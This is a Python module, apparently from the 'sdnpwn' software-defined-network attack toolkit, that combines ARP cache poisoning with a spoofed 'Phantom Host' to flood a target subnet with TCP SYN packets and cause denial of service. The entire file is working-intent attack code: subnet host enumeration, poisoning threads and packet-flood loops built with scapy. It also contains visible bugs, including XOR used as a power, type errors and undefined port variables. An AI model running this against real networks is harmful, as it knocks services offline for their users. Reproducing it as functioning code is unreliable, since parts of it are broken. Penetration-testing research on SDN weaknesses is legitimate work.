from scapy.all import *
import sys
from time import sleep
import netifaces
from threading import Thread

import modules.sdnpwn_common as sdnpwn
import modules.dp_arp_poison as dpap

def info():
  return "Leverages the DP ARP poisoning attack and Phantom Host Scan concepts to cause a large amount of network traffic, congesting the network and ultimately causing denial of service."
  
def usage():
  sdnpwn.addUsage("--iface", "Interface to use", True)
  sdnpwn.addUsage("--target", "Target network (e.g. 192.168.1.0/24)", True)
  sdnpwn.addUsage("--phantom-ip", "IP to give the Phantom Host", True)
  sdnpwn.addUsage("--phantom-mac", "MAC address to give the Phantom Host")
  sdnpwn.addUsage("--packets", "Number of packets to send during the attack", True)
  
  return sdnpwn.getUsage()

def preparePacket(targetIP, targetMAC, targetPort, srcIP, srcMac, sourcePort):
  ether = Ether(src=srcMac, dst=targetMAC)
  ip = IP(src=srcIP, dst=targetIP)
  tcpSYN = TCP(sport=sourcePort, dport=int(targetPort), flags="S", seq=random.randint(35000, 60000))
  pkt = ether/ip/tcpSYN
  return pkt

def sendPacket(interface, pkt, count):
  for i in range(0,count):
    sendp(pkt,iface=interface)
    
def run(params):
  conf.verb = 0
  
  interface = None
  target = None
  targetMAC = None
  phantomIP = None
  phantomMAC = None
  packetCount = 0
  
  targets = {}
  
  try:
    if("--iface" in params):
      interface = params[params.index("--iface")+1]
    if("--target" in params):
      target = params[params.index("--target")+1]
    if("--phantom-ip" in params):
      phantomIP = params[params.index("--phantom-ip")+1]
    if("--phantom-mac" in params):
      phantomMAC = params[params.index("--phantom-mac")+1]
    if("--packets" in params):
      packetCount = int(params[params.index("--packets")+1])
    
    if(interface == None or target == None or packetCount == None or phantomIP == None):
      print(info())
      print(usage())
      return
    
    if("/" in target):
      sdnpwn.message("Building list of target hosts (may take a minute)", sdnpwn.NORMAL)
      targetNetSplit = target.split("/")
      targetNetHostBits = 32 - targetNetSplit[1]
      targetNetAddress = targetNetSplit[0]
      noOfNetworkHosts = (2^targetNetHostBits)-2
           
      targetNetAddSplit = targetNetAddress.split(".")
      
      #TODO: Change this to support networks with a mask < 24 bits
      finalOctetVal = int(targetNetAddSplit[3])
      netAddressTemplate = str(targetNetAddSplit[0]) + "." + str(targetNetAddSplit[1]) + "." + str(targetNetAddSplit[2]) + "."
      for i in range(finalOctetVal, noOfNetworkHosts):
        try:
          targets[netAddressTemplate + str(i)] = sdnpwn.getTargetMacAddress(interface, netAddressTemplate + str(i))
        except:
          pass
    
      sdnpwn.message("Found " + len(targets) + " targets in total", sdnpwn.NORMAL)
    
    else:
      targets[target] = sdnpwn.getTargetMacAddress(interface, target)
  
  except:
    print(info())
    print(usage())
    return
  
  if(phantomMAC == None):
    phantomMAC = sdnpwn.generateRandomMacAddress()
    sdnpwn.message("Generated Phantom host MAC: " + phantomMAC, sdnpwn.NORMAL)
      
  thisHostIP = sdnpwn.getIPAddress(interface)
  thisHostMAC = sdnpwn.getMacAddress(interface)
  
  #srcPort = random.randint(35000, 60000)
  #dstPort = random.randint(35000, 60000)
  
  sdnpwn.message("Starting attack", sdnpwn.NORMAL)
  for t in targets:
    try:
      poisoningThread = Thread(target=dpap.arpCachePoison, args=(interface, t, targets[t], phantomIP, phantomMAC, thisHostIP, thisHostMAC, True, 2)).start()
    except Exception as e:
      sdnpwn.message("Issue starting poisoning thread", sdnpwn.ERROR)
      print(e)
      return
      
    while(dpap.isPoisoningComplete() == False):
      sleep(1)
    
    sdnpwn.message("Starting packet stream to " + t, sdnpwn.NORMAL)
    pkt = preparePacket(t, targets[t], dstPort, phantomIP, thisHostMAC, srcPort)
    sendPacket(interface, pkt, packetCount)
    sdnpwn.message("Finishing up...", sdnpwn.NORMAL)
    dpap.stopPoisoning()
    return
  
  